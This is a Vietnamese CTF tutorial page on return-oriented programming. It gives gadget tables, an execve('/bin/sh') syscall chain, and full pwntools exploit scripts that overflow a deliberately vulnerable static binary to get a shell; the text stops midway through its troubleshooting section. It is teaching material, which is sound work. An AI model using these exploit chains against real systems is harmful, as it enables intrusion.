@@ -1,0 +1,528 @@
+<title>ROP Basics</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap">
+<style>
+:root{
+  --bg:#f4f2ee;--surface:#fffdf9;--surface-2:#eceae3;--fg:#23211c;--muted:#6c675c;
+  --line:#d9d5cb;--accent:#b23a1e;--accent-soft:#f3dcd2;--ok:#2f7d4f;--ok-soft:#dcefe2;
+  --danger:#c0392b;--danger-soft:#f6ddd8;--warn:#b8860b;--warn-soft:#f3e7c7;
+  --mem:#3a6ea5;--mem-soft:#dce8f4;--code-bg:#1d1b17;--code-fg:#e8e4d8;
+  --font-head:"Space Grotesk",system-ui,sans-serif;--font-body:"Inter",system-ui,sans-serif;
+  --font-mono:"JetBrains Mono",ui-monospace,monospace;--maxw:740px;
+}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --danger:#e8705f;--danger-soft:#331c18;--warn:#d9b55f;--warn-soft:#2e2713;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}}
+:root[data-theme="dark"]{
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --danger:#e8705f;--danger-soft:#331c18;--warn:#d9b55f;--warn-soft:#2e2713;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}
+*{box-sizing:border-box}
+body{background:var(--bg);color:var(--fg);font-family:var(--font-body);line-height:1.68;font-size:16.5px;-webkit-font-smoothing:antialiased}
+.wrap{max-width:var(--maxw);margin:0 auto;padding-inline:max(18px,env(safe-area-inset-left,0px)) max(18px,env(safe-area-inset-right,0px))}
+.wide{max-width:1000px}
+header.hero{border-bottom:1px solid var(--line);background:linear-gradient(180deg,var(--surface),transparent)}
+.hero-inner{padding-block:42px 30px}
+.kicker{font-family:var(--font-mono);font-size:12.5px;letter-spacing:.13em;text-transform:uppercase;color:var(--accent);font-weight:700}
+h1{font-family:var(--font-head);font-weight:700;font-size:clamp(30px,6.5vw,48px);line-height:1.02;margin:.3em 0 .25em;letter-spacing:-.015em;word-break:break-word}
+.sub{color:var(--muted);font-size:17px;max-width:56ch}
+.meta-row{display:flex;flex-wrap:wrap;gap:8px;margin-top:18px}
+.chip{font-family:var(--font-mono);font-size:12px;padding:5px 10px;border:1px solid var(--line);border-radius:999px;background:var(--surface);color:var(--muted)}
+.chip b{color:var(--fg);font-weight:600}
+.toc{display:flex;flex-wrap:wrap;gap:6px;margin-top:18px}
+.toc a{font-family:var(--font-mono);font-size:11.5px;text-decoration:none;color:var(--muted);border:1px solid var(--line);padding:4px 9px;border-radius:7px;background:var(--surface)}
+.toc a:hover{color:var(--accent);border-color:var(--accent)}
+h2{font-family:var(--font-head);font-weight:700;font-size:clamp(22px,4vw,28px);letter-spacing:-.01em;margin:0 0 2px;text-wrap:balance}
+h3{font-family:var(--font-head);font-weight:600;font-size:19px;margin:26px 0 6px}
+h4{font-family:var(--font-head);font-weight:600;font-size:16px;margin:18px 0 4px}
+section.block{padding-block:34px;border-bottom:1px solid var(--line)}
+.secnum{font-family:var(--font-mono);font-size:12.5px;color:var(--accent);font-weight:700;letter-spacing:.09em}
+p{margin:12px 0}strong{font-weight:600}a{color:var(--accent);text-underline-offset:3px}
+.lead{font-size:18px}
+ul,ol{padding-left:22px;margin:12px 0}li{margin:7px 0}
+mark{background:var(--accent-soft);color:inherit;padding:0 4px;border-radius:3px;font-family:var(--font-mono);font-size:.9em}
+.mem-term{color:var(--mem);font-weight:600}
+.note{border-left:3px solid var(--accent);background:var(--surface);padding:13px 16px;border-radius:0 10px 10px 0;margin:18px 0;font-size:15px}
+.note.tip{border-color:var(--ok)}.note.warn{border-color:var(--danger)}
+.note .tag{font-family:var(--font-mono);font-size:11px;text-transform:uppercase;letter-spacing:.1em;color:var(--muted);font-weight:700;display:block;margin-bottom:3px}
+.tldr{background:var(--accent-soft);border:1px solid var(--line);border-radius:14px;padding:18px 20px}
+.tldr p{margin:6px 0}
+.combat{border:2px solid var(--accent);border-radius:14px;overflow:hidden;margin:4px 0 0}
+.combat-h{background:var(--accent);color:#fff;font-family:var(--font-head);font-weight:700;padding:10px 16px;font-size:15.5px}
+.combat-b{padding:2px 16px 10px;background:var(--surface)}
+.combat-row{padding:12px 0;border-bottom:1px solid var(--line)}
+.combat-row:last-child{border-bottom:none}
+.combat-row .lab{font-family:var(--font-mono);font-size:11px;font-weight:700;letter-spacing:.05em;color:var(--accent);text-transform:uppercase;margin-bottom:5px;display:block}
+.combat-row p{margin:0;font-size:14px}.combat-row pre{margin:4px 0 0}
+pre{background:var(--code-bg);color:var(--code-fg);font-family:var(--font-mono);font-size:13px;line-height:1.62;padding:16px;border-radius:12px;overflow-x:auto;margin:14px 0;border:1px solid #00000030}
+pre .c{color:#8a8574}pre .k{color:#e86a48}pre .s{color:#9cc591}pre .d{color:#7fb0e0}pre .p{color:#d9b55f}
+code{font-family:var(--font-mono);font-size:.88em;background:var(--surface-2);padding:1.5px 6px;border-radius:5px;word-break:break-word}
+pre code{background:none;padding:0;font-size:inherit}
+.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));gap:12px;margin:16px 0}
+.card{background:var(--surface);border:1px solid var(--line);border-radius:12px;padding:14px 16px}
+.card h4{margin:0 0 4px;font-size:15px}.card p{margin:0;font-size:14px;color:var(--muted)}
+.card .term{font-family:var(--font-mono);color:var(--accent);font-size:12.5px}
+.tablewrap{overflow-x:auto;-webkit-overflow-scrolling:touch;margin:14px 0}
+table{width:100%;border-collapse:collapse;font-size:14px;min-width:540px}
+th,td{text-align:left;padding:9px 12px;border-bottom:1px solid var(--line);vertical-align:top}
+th{font-family:var(--font-mono);font-size:11.5px;text-transform:uppercase;letter-spacing:.05em;color:var(--muted)}
+td code{font-size:.85em}
+.yes{color:var(--ok);font-weight:700}.no{color:var(--danger);font-weight:700}.maybe{color:var(--warn);font-weight:700}
+.lab{background:var(--surface);border:1px solid var(--line);border-radius:16px;padding:18px;margin:20px 0}
+.step{display:grid;grid-template-columns:32px 1fr;gap:13px;margin:16px 0}
+.step .n{font-family:var(--font-mono);font-weight:700;color:#fff;background:var(--accent);width:28px;height:28px;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:13px}
+.step .body h4{margin:1px 0 4px}
+.tabs{display:flex;gap:6px;flex-wrap:wrap;margin:16px 0 0}
+.tab{font-family:var(--font-mono);font-size:12.5px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:8px 13px;border-radius:9px 9px 0 0;cursor:pointer;border-bottom:none}
+.tab.active{background:var(--code-bg);color:var(--code-fg);border-color:var(--code-bg)}
+.tabpanel pre{margin-top:0;border-top-left-radius:0}
+.reqitem{display:grid;grid-template-columns:30px 1fr;gap:10px;border:1px solid var(--line);border-radius:11px;padding:12px 14px;background:var(--surface);align-items:start;margin:8px 0}
+.reqitem .ico{font-size:17px;line-height:1.3}
+.reqitem h4{margin:0 0 2px;font-size:15px}.reqitem p{margin:0;font-size:14px;color:var(--muted)}
+.ropmap{font-family:var(--font-mono);font-size:12.5px;display:flex;flex-direction:column;gap:3px;margin:12px 0}
+.rr{display:grid;grid-template-columns:150px 1fr;gap:8px;border:1px solid var(--line);border-radius:7px;padding:8px 10px;background:var(--surface-2)}
+.rr .a{color:var(--mem);white-space:nowrap}
+.rr.g{background:var(--mem-soft);border-color:var(--mem)}.rr.v{background:var(--surface)}.rr.call{background:var(--accent-soft);border-color:var(--accent)}
+details{margin-top:8px;border:1px solid var(--line);border-radius:9px;padding:0 12px;background:var(--surface)}
+summary{cursor:pointer;font-size:14px;color:var(--muted);font-family:var(--font-mono);padding:10px 0}
+details[open] summary{color:var(--accent)}details .dc{padding-bottom:10px;font-size:14.5px}
+.ex{background:var(--surface);border:1px solid var(--line);border-left:3px solid var(--mem);border-radius:0 12px 12px 0;padding:13px 16px;margin:12px 0}
+.ex .level{font-family:var(--font-mono);font-size:11px;color:var(--mem);font-weight:700;letter-spacing:.06em}
+figure{margin:22px 0}figure.dg{border:1px solid var(--line);border-radius:14px;background:var(--surface);padding:16px 16px 6px}
+figure svg{display:block;max-width:100%;height:auto;margin:0 auto}
+figcaption{font-size:13px;color:var(--muted);text-align:center;margin-top:10px;line-height:1.55}
+.ttoggle{position:fixed;top:calc(10px + env(safe-area-inset-top,0px));right:calc(10px + env(safe-area-inset-right,0px));z-index:20;font-family:var(--font-mono);font-size:11px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:6px 10px;border-radius:999px;cursor:pointer}
+footer{padding-block:26px 44px;color:var(--muted);font-size:13.5px}
+:focus-visible{outline:2px solid var(--accent);outline-offset:2px;border-radius:4px}
+@media(prefers-reduced-motion:reduce){*{transition:none!important}}
+.sim{background:var(--surface-2);border:1px solid var(--line);border-radius:12px;padding:16px;margin:12px 0}
+.sim .regs{display:grid;grid-template-columns:repeat(auto-fit,minmax(120px,1fr));gap:6px;font-family:var(--font-mono);font-size:12px;margin-bottom:12px}
+.sim .reg{border:1px solid var(--line);border-radius:6px;padding:5px 8px;background:var(--surface)}
+.sim .reg b{color:var(--accent)}
+.sim .btns{display:flex;gap:8px;flex-wrap:wrap}
+.sim button{font-family:var(--font-mono);font-size:12.5px;border:1px solid var(--line);background:var(--surface);color:var(--fg);padding:7px 12px;border-radius:8px;cursor:pointer}
+.sim button:hover{border-color:var(--accent);color:var(--accent)}
+.sim .cur{font-family:var(--font-mono);font-size:12px;color:var(--mem);margin-top:8px}
+</style>
+
+<button class="ttoggle" id="themeBtn" aria-label="Đổi giao diện">◐ giao diện</button>
+
+<header class="hero">
+  <div class="wrap hero-inner">
+    <div class="kicker">PWN · Phase 2 · Bài 7</div>
+    <h1>ROP Basics</h1>
+    <p class="sub"><strong>Return-Oriented Programming</strong>: khi NX chặn shellcode, ta "lập trình" bằng các <mark>gadget</mark> có sẵn — mỗi gadget là vài lệnh kết thúc <code>ret</code>. Xâu chuỗi địa chỉ gadget trên stack → CPU chạy lần lượt như một chương trình. Bài này dựng <strong>chuỗi execve("/bin/sh") bằng syscall, số thật</strong>.</p>
+    <div class="meta-row">
+      <span class="chip"><b>Mức:</b> Trung bình (Phase 2)</span>
+      <span class="chip"><b>Binary mẫu:</b> x86-64 static, NX, no-PIE</span>
+      <span class="chip"><b>Cần trước:</b> <a href="ret2libc.html" style="color:inherit">ret2libc</a>, asm</span>
+      <span class="chip"><b>Thời lượng:</b> ~55 phút</span>
+    </div>
+    <div class="toc">
+      <a href="#s0">00 Tóm tắt</a><a href="#combat">⚡ Combat</a><a href="#s1">01 Nền tảng</a><a href="#s2">02 Vì sao</a>
+      <a href="#s3">03 Gadget</a><a href="#s4">04 Chuỗi execve</a><a href="#s5">05 Mô phỏng</a><a href="#s6">06 Tự tìm</a>
+      <a href="#s7">07 Exploit thật</a><a href="#s8">08 Công cụ</a><a href="#s9">09 Gỡ lỗi</a>
+      <a href="#s10">10 Biến thể</a><a href="#s11">11 Bài tập</a><a href="#s12">12 Thuật ngữ</a>
+    </div>
+  </div>
+</header>
+
+<main>
+
+<!-- 00 -->
+<section class="block" id="s0">
+ <div class="wrap">
+  <div class="secnum">00 / TÓM TẮT 1 PHÚT</div>
+  <h2>Bài này nói về cái gì?</h2>
+  <div class="tldr">
+    <p><strong>Gadget:</strong> một dãy ngắn lệnh máy kết thúc <code>ret</code>, vd <code>pop rdi; ret</code>. <code>ret</code> = "lấy địa chỉ kế trên stack rồi nhảy tới" → nếu stack toàn địa chỉ gadget, CPU chạy chúng liên tiếp.</p>
+    <p><strong>ROP chain:</strong> xâu các gadget + hằng số trên stack để đặt thanh ghi rồi gọi hàm/syscall. Vd đặt <code>rax=59, rdi=&amp;"/bin/sh", rsi=0, rdx=0</code> rồi <code>syscall</code> → <code>execve("/bin/sh",0,0)</code>.</p>
+    <p><strong>Vì sao cần:</strong> NX chặn shellcode; ROP dùng <em>code có sẵn</em> nên luôn thực thi được. Là xương sống của mọi khai thác stack hiện đại.</p>
+  </div>
+  <p class="lead" style="margin-top:16px">Nếu chỉ nhớ một điều: <strong>stack = "danh sách lệnh"; mỗi ret nhảy tới địa chỉ kế; pop để nạp hằng số vào thanh ghi.</strong></p>
+ </div>
+</section>
+
+<!-- COMBAT -->
+<section class="block" id="combat">
+ <div class="wrap">
+  <div class="combat">
+    <div class="combat-h">⚡ COMBAT CARD — dán chạy khi đang thi</div>
+    <div class="combat-b">
+      <div class="combat-row"><span class="lab">🔎 Tìm gadget</span>
+<pre><code>ROPgadget --binary ./a | grep "pop rdi ; ret"
+ROPgadget --binary ./a | grep "pop rax ; ret"
+ROPgadget --binary ./a --only "pop|ret"
+<span class="c"># syscall gadget:</span>  grep "syscall"</code></pre></div>
+      <div class="combat-row"><span class="lab">🧩 Chuỗi execve syscall (x86-64)</span>
+<pre><code>pop rax; ret → 59     <span class="c"># SYS_execve</span>
+pop rdi; ret → &amp;"/bin/sh"
+pop rsi; ret → 0
+pop rdx; ret → 0
+syscall</code></pre></div>
+      <div class="combat-row"><span class="lab">⚡ pwntools ROP tự dựng</span>
+<pre><code>r = ROP(exe)
+r.execve(next(exe.search(b"/bin/sh")), 0, 0)   <span class="c"># tự chọn gadget</span>
+<span class="c"># hoặc:  r.rax=59; r.rdi=binsh; r.rsi=0; r.rdx=0; r.raw(syscall)</span></code></pre></div>
+      <div class="combat-row"><span class="lab">🧱 Bố cục stack</span>
+<pre><code>[pad][g_rax][59][g_rdi][binsh][g_rsi][0][g_rdx][0][syscall]
+<span class="c"># mỗi gadget pop ĂN đúng số hằng số kế nó</span></code></pre></div>
+      <div class="combat-row"><span class="lab">⚠️ Bẫy</span>
+        <p>Gadget "bẩn" (pop rsi; pop r15; ret) ăn 2 hằng → thêm 1 giá trị rác. Thiếu "/bin/sh" → ghi vào bss bằng chuỗi read trước. movaps align khi gọi system (không cần cho syscall thuần).</p></div>
+    </div>
+  </div>
+ </div>
+</section>
+
+<!-- 01 -->
+<section class="block" id="s1">
+ <div class="wrap">
+  <div class="secnum">01 / NỀN TẢNG BẮT BUỘC</div>
+  <h2><code>ret</code> biến stack thành chương trình</h2>
+  <p>Lệnh <code>ret</code> làm hai việc: <strong>pop</strong> 8 byte trên đỉnh stack vào <code>rip</code> rồi nhảy tới đó; <code>rsp</code> tiến lên 8. Vậy nếu đỉnh stack là một dãy địa chỉ, mỗi <code>ret</code> "tiêu thụ" một địa chỉ và nhảy tới. <span class="mem-term">Gadget</span> là đoạn lệnh ngắn <em>kết thúc bằng ret</em> — chạy xong nó lại <code>ret</code>, nhảy tới gadget kế. Đó là cách ta ghép "chương trình" từ mảnh vụn.</p>
+  <figure class="dg">
+  <svg viewBox="0 0 620 150" role="img" aria-label="stack chứa địa chỉ gadget; mỗi ret nhảy tới gadget kế, pop nạp hằng số" xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor">
+    <g font-family="monospace" font-size="11">
+    <rect x="30" y="20" width="200" height="22" rx="4" stroke-width="1.4" stroke="var(--mem)"/><text x="130" y="35" text-anchor="middle" fill="var(--mem)" stroke="none">pop rdi; ret  ← rsp</text>
+    <rect x="30" y="44" width="200" height="22" rx="4" stroke-width="1.2"/><text x="130" y="59" text-anchor="middle" fill="currentColor" stroke="none">&amp;"/bin/sh"  (vào rdi)</text>
+    <rect x="30" y="68" width="200" height="22" rx="4" stroke-width="1.4" stroke="var(--mem)"/><text x="130" y="83" text-anchor="middle" fill="var(--mem)" stroke="none">pop rsi; ret</text>
+    <rect x="30" y="92" width="200" height="22" rx="4" stroke-width="1.2"/><text x="130" y="107" text-anchor="middle" fill="currentColor" stroke="none">0  (vào rsi)</text>
+    <rect x="30" y="116" width="200" height="22" rx="4" stroke-width="1.6" stroke="#e8663e"/><text x="130" y="131" text-anchor="middle" fill="#e8663e" stroke="none">syscall / system</text>
+    <text x="380" y="50" font-size="11.5" fill="currentColor" stroke="none">Mỗi ret pop địa chỉ kế</text>
+    <text x="380" y="70" font-size="11.5" fill="currentColor" stroke="none">→ nhảy tới gadget đó.</text>
+    <text x="380" y="92" font-size="11.5" fill="var(--mem)" stroke="none">pop nạp hằng số kế</text>
+    <text x="380" y="112" font-size="11.5" fill="var(--mem)" stroke="none">vào thanh ghi.</text>
+    </g>
+  </svg>
+  <figcaption>Stack = danh sách địa chỉ gadget + hằng số. ret chạy từng gadget; pop nạp hằng.</figcaption>
+  </figure>
+  <h4 style="margin-top:8px">Định nghĩa nhanh</h4>
+  <div class="grid">
+    <div class="card"><div class="term">ROP</div><p>Lập trình bằng gadget thay vì shellcode.</p></div>
+    <div class="card"><div class="term">gadget</div><p>Vài lệnh kết thúc ret.</p></div>
+    <div class="card"><div class="term">ROP chain</div><p>Dãy gadget+hằng trên stack.</p></div>
+    <div class="card"><div class="term">syscall gadget</div><p>Lệnh <code>syscall; ret</code> để gọi kernel.</p></div>
+    <div class="card"><div class="term">stack pivot</div><p>Đổi rsp sang vùng khác (bài riêng).</p></div>
+    <div class="card"><div class="term">SYS_execve</div><p>syscall số 59 (x86-64).</p></div>
+  </div>
+ </div>
+</section>
+
+<!-- 02 -->
+<section class="block" id="s2">
+ <div class="wrap">
+  <div class="secnum">02 / VÌ SAO CÓ KỸ THUẬT</div>
+  <h2>Turing-complete từ mảnh vụn</h2>
+  <p>Shacham (2007) chỉ ra: chỉ với các gadget có sẵn trong libc, ta dựng được tính toán <strong>Turing-complete</strong> — tức làm được <em>mọi thứ</em> code mới làm được, mà không cần nhét code mới (vượt NX). Trong CTF, thường không cần Turing-complete: chỉ cần vài gadget để đặt thanh ghi rồi gọi <code>system</code>/<code>execve</code>/<code>mprotect</code>. ROP là nền của <a href="ret2libc.html">ret2libc</a>, <a href="ret2csu.html">ret2csu</a>, <a href="ret2syscall_mprotect.html">ret2syscall</a>, <a href="srop.html">SROP</a>...</p>
+ </div>
+</section>
+
+<!-- 03 Gadget -->
+<section class="block" id="s3">
+ <div class="wrap">
+  <div class="secnum">03 / GADGET · MỤC LÕI</div>
+  <h2>Các gadget cốt lõi &amp; số thật</h2>
+  <div class="tablewrap"><table>
+    <thead><tr><th>Gadget</th><th>Làm gì</th><th>Addr mẫu (static)</th></tr></thead>
+    <tbody>
+      <tr><td><code>pop rdi; ret</code></td><td>Đặt rdi (đối số 1)</td><td><code>0x401263</code></td></tr>
+      <tr><td><code>pop rsi; ret</code></td><td>Đặt rsi (đối số 2)</td><td><code>0x40955e</code></td></tr>
+      <tr><td><code>pop rdx; ret</code></td><td>Đặt rdx (đối số 3)</td><td><code>0x4017cf</code></td></tr>
+      <tr><td><code>pop rax; ret</code></td><td>Đặt rax (số syscall)</td><td><code>0x44db34</code></td></tr>
+      <tr><td><code>syscall; ret</code></td><td>Gọi kernel</td><td><code>0x40137c</code></td></tr>
+      <tr><td><code>ret</code></td><td>Căn stack (movaps)</td><td><code>0x40101a</code></td></tr>
+    </tbody>
+  </table></div>
+  <div class="note tip"><span class="tag">Gadget "bẩn"</span>Thường không có <code>pop rsi; ret</code> sạch mà là <code>pop rsi; pop r15; ret</code> (ăn 2 hằng). Khi dùng, chèn thêm 1 giá trị rác cho <code>r15</code>: <code>[g_rsi_r15][rsi_value][rác]</code>. pwntools ROP tự xử lý.</div>
+
+  <h3>Bố cục stack: execve("/bin/sh",0,0) (số thật)</h3>
+  <div class="ropmap">
+    <div class="rr v" style="opacity:.7"><span class="a">offset 0..71</span><span>b"A"*72 (lấp tới saved RIP)</span></div>
+    <div class="rr g"><span class="a">0x44db34</span><span>pop rax; ret</span></div>
+    <div class="rr v"><span class="a">59</span><span>SYS_execve → rax</span></div>
+    <div class="rr g"><span class="a">0x401263</span><span>pop rdi; ret</span></div>
+    <div class="rr v"><span class="a">0x4c0f43</span><span>&amp;"/bin/sh" (chuỗi trong binary) → rdi</span></div>
+    <div class="rr g"><span class="a">0x40955e</span><span>pop rsi; ret</span></div>
+    <div class="rr v"><span class="a">0</span><span>argv=NULL → rsi</span></div>
+    <div class="rr g"><span class="a">0x4017cf</span><span>pop rdx; ret</span></div>
+    <div class="rr v"><span class="a">0</span><span>envp=NULL → rdx</span></div>
+    <div class="rr call"><span class="a">0x40137c</span><span>syscall → execve("/bin/sh",0,0)</span></div>
+  </div>
+ </div>
+</section>
+
+<!-- 04 Chuỗi -->
+<section class="block" id="s4">
+ <div class="wrap">
+  <div class="secnum">04 / DỰNG CHUỖI</div>
+  <h2>Nếu không có sẵn "/bin/sh"</h2>
+  <p>Binary static có thể không chứa chuỗi "/bin/sh". Khi đó: <strong>ghi "/bin/sh" vào bss</strong> trước (dùng syscall <code>read</code> hoặc gadget <code>mov [rdi], rax</code>), rồi execve trỏ tới bss.</p>
+  <pre><code><span class="c"># cách 1: read(0, bss, 8) nhập "/bin/sh\0" rồi execve(bss,0,0)</span>
+pop rax; ret → <span class="d">0</span>          <span class="c"># SYS_read</span>
+pop rdi; ret → <span class="d">0</span>          <span class="c"># fd=0 (stdin)</span>
+pop rsi; ret → bss         <span class="c"># buf</span>
+pop rdx; ret → <span class="d">8</span>          <span class="c"># len</span>
+syscall                    <span class="c"># → nhập "/bin/sh\0"</span>
+<span class="c"># rồi chuỗi execve(bss,0,0)</span></code></pre>
+  <div class="note"><span class="tag">write-what-where gadget</span>Nếu có <code>mov qword [rdi], rax; ret</code>: pop rdi=bss, pop rax="/bin/sh" (8 byte số), rồi gadget ghi. Rất hữu ích khi stdin không dùng được.</div>
+ </div>
+</section>
+
+<!-- 05 Mô phỏng -->
+<section class="block" id="s5">
+ <div class="wrap wide">
+  <div class="secnum">05 / TỰ TAY THỬ</div>
+  <h2>Chạy từng gadget — xem thanh ghi đổi</h2>
+  <p>Bấm "Bước" để CPU thực thi gadget kế trên stack; theo dõi thanh ghi &amp; rsp. Khi tới <code>syscall</code> với rax=59 → execve.</p>
+  <div class="lab">
+    <div class="sim" id="sim">
+      <div class="regs" id="regs"></div>
+      <div class="btns">
+        <button id="stepb">▶ Bước gadget</button>
+        <button id="resetb">↺ reset</button>
+      </div>
+      <div class="cur" id="cur"></div>
+    </div>
+  </div>
+ </div>
+</section>
+
+<!-- 06 Tự tìm -->
+<section class="block" id="s6">
+ <div class="wrap">
+  <div class="secnum">06 / TỰ TÌM THÔNG TIN</div>
+  <h2>Gadget &amp; offset</h2>
+  <div class="step"><div class="n">1</div><div class="body"><h4>Liệt kê gadget</h4>
+    <pre><code><span class="p">$</span> ROPgadget --binary ./a &gt; gadgets.txt
+<span class="p">$</span> grep -E "pop (rdi|rsi|rdx|rax) ; ret" gadgets.txt
+<span class="p">$</span> grep "syscall" gadgets.txt</code></pre></div></div>
+  <div class="step"><div class="n">2</div><div class="body"><h4>Chuỗi "/bin/sh" &amp; bss</h4>
+    <pre><code><span class="p">&gt;&gt;&gt;</span> <span class="k">next</span>(exe.search(b<span class="s">"/bin/sh"</span>))   <span class="c"># có sẵn?</span>
+<span class="p">&gt;&gt;&gt;</span> exe.bss(<span class="d">0x100</span>)                  <span class="c"># chỗ ghi nếu không có</span></code></pre></div></div>
+  <div class="step"><div class="n">3</div><div class="body"><h4>Offset tràn</h4>
+    <pre><code><span class="p">&gt;&gt;&gt;</span> cyclic(<span class="d">200</span>) → crash → cyclic_find(...)   <span class="c"># = 72</span></code></pre></div></div>
+ </div>
+</section>
+
+<!-- 07 Exploit thật -->
+<section class="block" id="s7">
+ <div class="wrap wide">
+  <div class="secnum">07 / EXPLOIT ĐẦY ĐỦ</div>
+  <h2>execve("/bin/sh") bằng syscall (static binary)</h2>
+  <pre><code><span class="c">// vuln.c — gcc vuln.c -o vuln -static -fno-stack-protector -no-pie</span>
+<span class="k">int</span> main(){ <span class="k">char</span> b[<span class="d">0x40</span>]; read(<span class="d">0</span>, b, <span class="d">0x200</span>); }   <span class="c">// overflow, binary static</span></code></pre>
+  <div class="tabs" id="tabs">
+    <button class="tab active" data-t="a">A · thủ công</button>
+    <button class="tab" data-t="b">B · pwntools ROP</button>
+    <button class="tab" data-t="c">C · pwnld</button>
+  </div>
+
+  <div class="tabpanel" id="panel-a">
+<pre><code><span class="c"># BẢN A — số thật, chuỗi execve bằng syscall.</span>
+<span class="k">from</span> pwn <span class="k">import</span> *
+exe = ELF(<span class="s">"./vuln"</span>, checksec=<span class="k">False</span>)
+p = process(exe.path)
+
+OFF = <span class="d">72</span>
+pop_rax = <span class="d">0x44db34</span>; pop_rdi = <span class="d">0x401263</span>
+pop_rsi = <span class="d">0x40955e</span>; pop_rdx = <span class="d">0x4017cf</span>; syscall = <span class="d">0x40137c</span>
+binsh   = <span class="k">next</span>(exe.search(b<span class="s">"/bin/sh"</span>))     <span class="c"># 0x4c0f43 nếu static có sẵn</span>
+
+chain  = b<span class="s">"A"</span>*OFF
+chain += p64(pop_rax) + p64(<span class="d">59</span>)          <span class="c"># SYS_execve</span>
+chain += p64(pop_rdi) + p64(binsh)
+chain += p64(pop_rsi) + p64(<span class="d">0</span>)
+chain += p64(pop_rdx) + p64(<span class="d">0</span>)
+chain += p64(syscall)
+p.send(chain)
+p.interactive()</code></pre>
+<div class="note warn"><span class="tag">Thành thật</span>Địa chỉ gadget (<code>0x44db34</code>…) &amp; <code>binsh=0x4c0f43</code> là của binary mẫu static — của bạn khác (<code>ROPgadget</code>). <code>OFF=72</code> dò bằng cyclic. Nếu <code>pop rsi</code> là gadget bẩn (pop rsi; pop r15) → thêm 1 giá trị rác sau rsi value.</div>
+  </div>
+
+  <div class="tabpanel" id="panel-b" hidden>
+<pre><code><span class="c"># BẢN B — pwntools ROP tự chọn gadget &amp; xử lý gadget bẩn.</span>
+<span class="k">from</span> pwn <span class="k">import</span> *
+context.binary = exe = ELF(<span class="s">"./vuln"</span>, checksec=<span class="k">False</span>)
+p = process(exe.path)
+OFF = <span class="d">72</span>
+
+r = ROP(exe)
+binsh = <span class="k">next</span>(exe.search(b<span class="s">"/bin/sh"</span>))
+r.execve(binsh, <span class="d">0</span>, <span class="d">0</span>)              <span class="c"># tự dựng rax=59, rdi/rsi/rdx, syscall</span>
+<span class="c"># nếu không có /bin/sh: r.read(0, exe.bss(0x100), 8) trước</span>
+p.send(b<span class="s">"A"</span>*OFF + r.chain())
+p.sendline(b<span class="s">"/bin/sh\x00"</span>)             <span class="c"># nếu dùng read</span>
+p.interactive()
+log.info(r.dump())                     <span class="c"># in chuỗi ROP để kiểm</span></code></pre>
+<div class="note tip"><span class="tag">r.dump()</span><code>ROP.dump()</code> in bố cục chuỗi (địa chỉ + ý nghĩa) — cực tiện để debug thứ tự gadget &amp; gadget bẩn.</div>
+  </div>
+
+  <div class="tabpanel" id="panel-c" hidden>
+<pre><code><span class="c"># BẢN C — pwnld.</span>
+<span class="k">from</span> pwnld <span class="k">import</span> *
+context.binary = exe = ELF(<span class="s">"./vuln"</span>, checksec=<span class="k">False</span>)
+p = start(); OFF = <span class="d">72</span>
+r = ROP(exe)
+r.execve(<span class="k">next</span>(exe.search(b<span class="s">"/bin/sh"</span>)), <span class="d">0</span>, <span class="d">0</span>)
+sl(b<span class="s">"A"</span>*OFF + r.chain())
+ia()</code></pre>
+<div class="note"><span class="tag">pwnld</span>Dùng pwntools <code>ROP</code> y hệt; pwnld chỉ rút gọn I/O. Hiểu gadget để debug khi ROP tự động chọn sai.</div>
+  </div>
+
+  <h3>Checklist</h3>
+  <div class="reqitem"><span class="ico">🔎</span><div><h4>Chain lệch 8 byte</h4><p>Gadget bẩn ăn thêm hằng. Dùng r.dump() xem thứ tự.</p></div></div>
+  <div class="reqitem"><span class="ico">🔎</span><div><h4>Không có /bin/sh</h4><p>Ghi vào bss trước (read syscall), rồi execve(bss).</p></div></div>
+  <div class="reqitem"><span class="ico">🔎</span><div><h4>PIE bật</h4><p>Gadget = offset + base (leak trước). static thường no-PIE.</p></div></div>
+ </div>
+</section>
+
+<!-- 08 Công cụ -->
+<section class="block" id="s8">
+ <div class="wrap">
+  <div class="secnum">08 / CÔNG CỤ</div>
+  <h2>Hộp đồ nghề</h2>
+  <div class="grid">
+    <div class="card"><div class="term">ROPgadget / ropper</div><h4>Tìm gadget</h4><p>Liệt kê pop/syscall/mov.</p></div>
+    <div class="card"><div class="term">pwntools ROP</div><h4>Dựng tự động</h4><p><code>r.execve()</code>, <code>r.dump()</code>.</p></div>
+    <div class="card"><div class="term">cyclic</div><h4>Offset tràn</h4><p>De Bruijn pattern.</p></div>
+    <div class="card"><div class="term">one_gadget</div><h4>Gọn khi có libc</h4><p>Một nhảy = shell.</p></div>
+  </div>
+ </div>
+</section>
+
+<!-- 09 Gỡ lỗi -->
+<section class="block" id="s9">
+ <div class="wrap">
+  <div class="secnum">09 / GỠ LỖI</div>
+  <h2>Khi chain không chạy</h2>
+  <div class="grid">
+    <div class="card"><h4>Lệch do gadget bẩn</h4><p>pop rsi; pop r15; ret ăn 2 hằng. Thêm rác. r.dump() kiểm.</p></div>
+    <div class="card"><h4>Crash ngay gadget đầu</h4><p>Offset sai → saved RIP chưa đúng. Dò cyclic lại.</p></div>
+    <div class="card"><h4>syscall lỗi (rax trả -14)</h4><p>Đối số sai (con trỏ xấu). Kiểm rdi/rsi/rdx bằng gdb.</p></div>
